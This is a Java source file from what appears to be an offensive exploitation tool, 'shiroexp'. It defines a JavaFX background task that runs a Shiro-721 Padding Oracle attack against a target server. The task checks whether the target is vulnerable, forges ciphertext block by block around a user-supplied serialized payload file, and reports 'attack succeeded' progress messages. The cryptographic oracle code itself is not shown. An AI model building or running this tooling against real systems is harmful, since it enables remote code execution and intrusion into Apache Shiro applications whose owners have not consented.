package com.y5neko.shiroexp.misc;

import com.y5neko.shiroexp.request.shiro721.HttpRequestInfo;
import javafx.application.Platform;
import javafx.concurrent.Task;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Shiro721 攻击的异步任务
 * 在后台线程执行 Padding Oracle 攻击，避免阻塞 UI
 */
public class Shiro721AttackTask extends Task<String> {
    private HttpRequestInfo requestInfo;
    private byte[] payload;
    private int threadCount;

    // 使用原子引用存储当前进度，避免在后台线程调用 getProgress()
    private final AtomicReference<Double> currentProgress = new AtomicReference<>(0.0);

    /**
     * 构造函数
     * @param requestInfo HTTP 请求信息
     * @param payloadFile 序列化 payload 文件
     * @param threadCount 线程数
     * @throws IOException 读取文件失败
     */
    public Shiro721AttackTask(HttpRequestInfo requestInfo, File payloadFile, int threadCount) throws IOException {
        this.requestInfo = requestInfo;
        this.payload = Files.readAllBytes(payloadFile.toPath());
        this.threadCount = threadCount;
    }

    /**
     * 获取请求信息
     */
    public HttpRequestInfo getRequestInfo() {
        return requestInfo;
    }

    /**
     * 获取 payload
     */
    public byte[] getPayload() {
        return payload;
    }

    /**
     * 获取线程数
     */
    public int getThreadCount() {
        return threadCount;
    }

    @Override
    protected String call() throws Exception {
        // 检查是否被取消
        if (isCancelled()) {
            updateMessageSafe("任务已取消");
            return null;
        }

        // 创建 PaddingOracle 实例
        PaddingOracle oracle = new PaddingOracle(requestInfo, payload);
        oracle.setThreadCount(threadCount);

        // 设置进度回调
        oracle.setCallback(new PaddingOracle.AttackProgressCallback() {
            private int totalBlocks = 0;
            private int currentBlock = 0;

            @Override
            public void onVulnCheckStart() {
                updateMessageSafe("正在检测 Padding Oracle 漏洞...");
            }

            @Override
            public void onVulnCheckComplete(boolean vulnerable) {
                if (vulnerable) {
                    updateMessageSafe("[+] 目标存在漏洞！");
                } else {
                    updateMessageSafe("[-] 目标不存在漏洞");
                }
            }

            @Override
            public void onBlockStart(int blockNum, int totalBlocks) {
                this.totalBlocks = totalBlocks;
                this.currentBlock = blockNum;
                updateMessageSafe(String.format("正在处理块 %d/%d", blockNum, totalBlocks));
            }

            @Override
            public void onIntermediaryFound(int position, String intermediary) {
                double progress = currentProgress.get();
                if (totalBlocks > 0) {
                    // 计算总体进度
                    double blockProgress = (double) (currentBlock - 1) / totalBlocks;
                    double positionProgress = (double) position / 16;
                    double totalProgress = blockProgress + (positionProgress / totalBlocks);

                    // 更新进度值
                    currentProgress.set(totalProgress);
                    updateProgressAndMessageSafe(totalProgress, String.format("块 %d/%d - 位置 %d/16", currentBlock, totalBlocks, position));
                } else {
                    updateProgressAndMessageSafe(progress, String.format("位置 %d/16", position));
                }
            }

            @Override
            public void onCipherTextGenerated(String cipherText) {
                // 密文生成完成
            }

            @Override
            public void onAttackComplete(String result) {
                currentProgress.set(1.0);
                updateProgressAndMessageSafe(1.0, "攻击完");
                updateMessageSafe("攻击成功完成");
            }

            @Override
            public void onAttackFailed(String error) {
                updateMessageSafe("攻击失败: " + error);
            }

            @Override
            public void onLogMessage(String message) {
                // 日志已经通过 PaddingOracle 类输出到控制台
                // 这里可以额外处理，比如发送到 UI 日志区域
            }
        });

        // 执行攻击
        return oracle.encrypt();
    }

    /**
     * 安全地更新消息（确保在 FX 线程执行）
     */
    private void updateMessageSafe(final String message) {
        Platform.runLater(() -> updateMessage(message));
    }

    /**
     * 安全地更新进度和消息（确保在 FX 线程执行）
     */
    private void updateProgressAndMessageSafe(final double progress, final String message) {
        Platform.runLater(() -> {
            updateProgress(progress, 1.0);
            updateMessage(message);
        });
    }
}
